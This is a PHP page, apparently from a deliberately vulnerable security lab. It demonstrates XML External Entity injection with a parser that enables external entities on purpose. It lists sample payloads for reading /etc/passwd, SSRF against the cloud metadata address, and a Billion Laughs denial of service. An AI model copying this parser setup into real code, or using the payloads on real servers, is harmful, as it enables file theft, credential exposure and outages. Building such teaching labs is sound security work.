<?php
libxml_disable_entity_loader(false); // ⚠️ Dangerous!

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $xml = $_POST['xml'] ?? '';
    
    echo "<h3>XML Parser Output:</h3>";
    echo "<pre>";
    
    try {
        // VULNERABLE: Parsing XML without disabling entities
        $dom = new DOMDocument();
        $dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
        
        $elements = $dom->getElementsByTagName('*');
        foreach ($elements as $element) {
            echo htmlspecialchars($element->nodeName) . ": " . 
                 htmlspecialchars($element->nodeValue) . "\n";
        }
        
        // Try to extract entities
        if (strpos($xml, 'ENTITY') !== false) {
            echo "\n--- ENTITIES DETECTED AND PROCESSED ---\n";
        }
        
    } catch (Exception $e) {
        echo "Error: " . htmlspecialchars($e->getMessage());
    }
    
    echo "</pre>";
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>XXE Vulnerability Test</title>
    <style>
        body { padding: 20px; font-family: monospace; }
        textarea { width: 100%; height: 200px; font-family: monospace; }
        button { padding: 10px 20px; margin: 10px 0; }
        .example { background: #333; color: #0f0; padding: 15px; margin: 10px 0; }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #3498db;
            text-decoration: none;
            font-weight: 500;
            transition: color 0.3s ease;
        }
    </style>
</head>
<body>
    <h2>📄 XML External Entity (XXE) Test</h2>
    
    <form method="POST">
        <textarea name="xml" placeholder="Enter XML to parse">
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY test "Hello from XXE">
]>
<data>
  <name>John Doe</name>
  <message>&test;</message>
</data>
        </textarea><br>
        <button type="submit">Parse XML</button>
    </form>
    
    <div class="example">
<strong>Malicious XXE Payloads:</strong><br><br>
1. Read local file:<br>
&lt;?xml version="1.0"?&gt;<br>
&lt;!DOCTYPE data [<br>
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;<br>
]&gt;<br>
&lt;data&gt;&xxe;&lt;/data&gt;<br><br>

2. SSRF via XXE:<br>
&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;<br><br>

3. Denial of Service (Billion Laughs):<br>
&lt;!DOCTYPE data [<br>
  &lt;!ENTITY a0 "lol"&gt;<br>
  &lt;!ENTITY a1 "&a0;&a0;"&gt;<br>
  &lt;!ENTITY a2 "&a1;&a1;"&gt;<br>
  ... repeats ...<br>
]&gt;
    </div>
    
    <div style="background: #f8d7da; padding: 15px; margin: 20px 0;">
        <strong>⚠️ XXE Impact:</strong>
        <ul>
            <li>Read arbitrary files on server</li>
            <li>Server-side request forgery</li>
            <li>Denial of service attacks</li>
            <li>Port scanning internal network</li>
        </ul>
    </div>
    <a href="nav.php" class="back-link">← Back to Main Menu</a>
</body>
</html>
